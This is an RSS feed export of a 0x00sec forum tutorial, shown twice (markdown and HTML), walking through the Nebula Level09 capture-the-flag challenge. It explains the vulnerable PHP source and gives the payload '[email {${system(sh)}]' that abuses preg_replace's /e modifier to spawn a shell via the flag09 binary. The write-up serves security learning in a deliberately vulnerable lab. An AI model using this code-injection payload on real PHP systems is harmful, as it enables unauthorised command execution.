<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>How to pwned Nebula : Level09 - PHP preg_replace</title>
    <link>https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812</link>
    <description>#Exploit-Exercice : Nebula
---

##Level09 - PHP preg_replace

Hi everyone ! It&#39;s been a long time since the last Tutorial :) Today, this tutorial will focus on a vulnerable php application.

Let&#39;s begin !

## The source code 

Nebula provides us the php source code of the vulnerable app : 
```php
&lt;?php

function spam($email)
{
  $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email);
  $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);
  $contents = preg_replace(&quot;/\[/&quot;, &quot;&lt;&quot;, $contents);
  $contents = preg_replace(&quot;/\]/&quot;, &quot;&gt;&quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&gt;
```

Let&#39;s break the code into small piece

*n.b : the flag09 binary located in the /home/flag09 will run the php script*

## Understanding preg_replace and php variable 
---
### How does it work ? 

We have two function in this php code 

**spam** and **markup**

Here is the **spam** function : 
```php
function spam($email)
{
  $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email);
  $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email);
  
  return $email;
}
```

This function will simply replace the content of the $email variable 

if the regex find a &quot;.&quot;, the function will replace &quot;.&quot; with &quot;dot&quot;
if the regex find a &quot;@&quot;, the function will replace &quot;@&quot; with &quot;AT&quot;

*example : darlene@fsociety.com will output : darlene AT fsociety dot com*

Now let&#39;s dive into the markup function : 

```php
function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);
  $contents = preg_replace(&quot;/\[/&quot;, &quot;&lt;&quot;, $contents);
  $contents = preg_replace(&quot;/\]/&quot;, &quot;&gt;&quot;, $contents);

  return $contents;
}
```
the function markup have two arguments : **filename, useme**

Forget the useme variable, we will pass garbage data : *(ex: asdf, fsociety, unicorn)* because this variable is not used

filename is the path to our file name :slight_smile: as you can see in the first regex the function will search for a specific string

**[email (.*)]** 

If a string looks like the regex in the preg_replace : 
ex : 

* [email darlene@fsociety.com]
* [email eliot@fsociety.com]
* [email tyrell@e-corp.com]
* [email gideon@allsafe.com]

it will strip the string and execute the second part and pass it to spam 
*ex: 

* spam(darlene@fsociety.com)
* spam(eliot@fsociety.com)
* spam(tyrell@e-corp.com)
* spam( gideon@allsafe.com)

and the spam command will strip these emails
ex : 

* darlene AT fsociety dot com
* elio tAT fsociety dot com
* tyrell AT e-corpdot com
* gideon AT allsafedot com

### Exploiting preg_replace

Here is the problem of this piece of code : 

```php
  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);
```

the /e will execute the second argument of the preg_replace function as a php expression

Let&#39;s create our &quot;hack file&quot; 
```bash
echo &#39;[email {$filename}]&#39; &gt;/tmp/hack
```

Now when we run the flag09 binary the output will be : 

```bash
/tmp/hack
```

Now let&#39;s exploit it to get a shell
```bash
echo &#39;[email {${system(sh)}]&#39; &gt;/tmp/hack
```


this will output the return value of the system function : A shell :) 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/394cbbe3d84f961cae838d082bfd02e8379cb620.png&quot; width=&quot;690&quot; height=&quot;119&quot;&gt;

The next tutorial will cover Race Condition exploit :)</description>
    
    <lastBuildDate>Mon, 25 Jul 2016 12:37:07 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>How to pwned Nebula : Level09 - PHP preg_replace</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812/2</link>
        <pubDate>Sun, 21 Jan 2018 00:42:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-812-2</guid>
        <source url="https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812.rss">How to pwned Nebula : Level09 - PHP preg_replace</source>
      </item>
      <item>
        <title>How to pwned Nebula : Level09 - PHP preg_replace</title>
        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
        <description><![CDATA[
            <h2>
<span class="hashtag">#Exploit-Exercice</span> : Nebula</h2>
<p>#<span class="hashtag">#Level09</span> - PHP preg_replace</p>
<p>Hi everyone ! It’s been a long time since the last Tutorial <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Today, this tutorial will focus on a vulnerable php application.</p>
<p>Let’s begin !</p>
<h2>The source code</h2>
<p>Nebula provides us the php source code of the vulnerable app :</p>
<pre><code class="lang-php">&lt;?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "&lt;", $contents);
  $contents = preg_replace("/\]/", "&gt;", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&gt;
</code></pre>
<p>Let’s break the code into small piece</p>
<p><em>n.b : the flag09 binary located in the /home/flag09 will run the php script</em></p>
<h2>Understanding preg_replace and php variable</h2>
<hr>
<h3>How does it work ?</h3>
<p>We have two function in this php code</p>
<p><strong>spam</strong> and <strong>markup</strong></p>
<p>Here is the <strong>spam</strong> function :</p>
<pre><code class="lang-php">function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}
</code></pre>
<p>This function will simply replace the content of the $email variable</p>
<p>if the regex find a “.”, the function will replace “.” with “dot”<br>
if the regex find a “@”, the function will replace “@” with “AT”</p>
<p><em>example : <a href="mailto:darlene@fsociety.com">darlene@fsociety.com</a> will output : darlene AT fsociety dot com</em></p>
<p>Now let’s dive into the markup function :</p>
<pre><code class="lang-php">function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "&lt;", $contents);
  $contents = preg_replace("/\]/", "&gt;", $contents);

  return $contents;
}
</code></pre>
<p>the function markup have two arguments : <strong>filename, useme</strong></p>
<p>Forget the useme variable, we will pass garbage data : <em>(ex: asdf, fsociety, unicorn)</em> because this variable is not used</p>
<p>filename is the path to our file name <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> as you can see in the first regex the function will search for a specific string</p>
<p><strong>[email (.*)]</strong></p>
<p>If a string looks like the regex in the preg_replace :<br>
ex :</p>
<ul>
<li>[email <a href="mailto:darlene@fsociety.com">darlene@fsociety.com</a>]</li>
<li>[email <a href="mailto:eliot@fsociety.com">eliot@fsociety.com</a>]</li>
<li>[email <a href="mailto:tyrell@e-corp.com">tyrell@e-corp.com</a>]</li>
<li>[email <a href="mailto:gideon@allsafe.com">gideon@allsafe.com</a>]</li>
</ul>
<p>it will strip the string and execute the second part and pass it to spam<br>
*ex:</p>
<ul>
<li>spam(<a href="mailto:darlene@fsociety.com">darlene@fsociety.com</a>)</li>
<li>spam(<a href="mailto:eliot@fsociety.com">eliot@fsociety.com</a>)</li>
<li>spam(<a href="mailto:tyrell@e-corp.com">tyrell@e-corp.com</a>)</li>
<li>spam( <a href="mailto:gideon@allsafe.com">gideon@allsafe.com</a>)</li>
</ul>
<p>and the spam command will strip these emails<br>
ex :</p>
<ul>
<li>darlene AT fsociety dot com</li>
<li>elio tAT fsociety dot com</li>
<li>tyrell AT e-corpdot com</li>
<li>gideon AT allsafedot com</li>
</ul>
<h3>Exploiting preg_replace</h3>
<p>Here is the problem of this piece of code :</p>
<pre><code class="lang-php">  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
</code></pre>
<p>the /e will execute the second argument of the preg_replace function as a php expression</p>
<p>Let’s create our “hack file”</p>
<pre><code class="lang-bash">echo '[email {$filename}]' &gt;/tmp/hack
</code></pre>
<p>Now when we run the flag09 binary the output will be :</p>
<pre><code class="lang-bash">/tmp/hack
</code></pre>
<p>Now let’s exploit it to get a shell</p>
<pre><code class="lang-bash">echo '[email {${system(sh)}]' &gt;/tmp/hack
</code></pre>
<p>this will output the return value of the system function : A shell <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/394cbbe3d84f961cae838d082bfd02e8379cb620.png" width="690" height="119"></p>
<p>The next tutorial will cover Race Condition exploit <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812/1</link>
        <pubDate>Mon, 25 Jul 2016 12:28:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-812-1</guid>
        <source url="https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812.rss">How to pwned Nebula : Level09 - PHP preg_replace</source>
      </item>
  </channel>
</rss>
